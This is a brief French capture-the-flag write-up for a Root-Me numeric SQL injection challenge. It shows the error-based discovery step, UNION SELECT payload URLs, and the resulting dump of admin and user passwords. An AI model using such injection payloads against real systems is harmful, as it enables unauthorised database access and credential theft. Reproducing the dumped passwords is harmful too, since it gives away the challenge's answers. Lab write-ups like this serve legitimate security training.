# Solution CTF SQL-Injection Numérique :

On voit une page « Accueil » et avec un url : [http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3)

Je rajoute un guillement et on a une erreur : 

__Warning__: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "\" in __/challenge/web-serveur/ch18/index.php__ on line __80__  
unrecognized token: "\"

Donc on voit qu’on a une base SQLite 

J’effectue un union pour voir si on a un rendu :

[http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,2,3--](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,2,3--)

Parfait on nous revoit 2 et 3

Après cette commande :

[http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users--](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users--)

On a tout : 

__Admin__ : aTlkJYLjcbLmue3

  
__user1 __: vUrpgAsCTX

  
__user2 __: aFjRKx7j9d
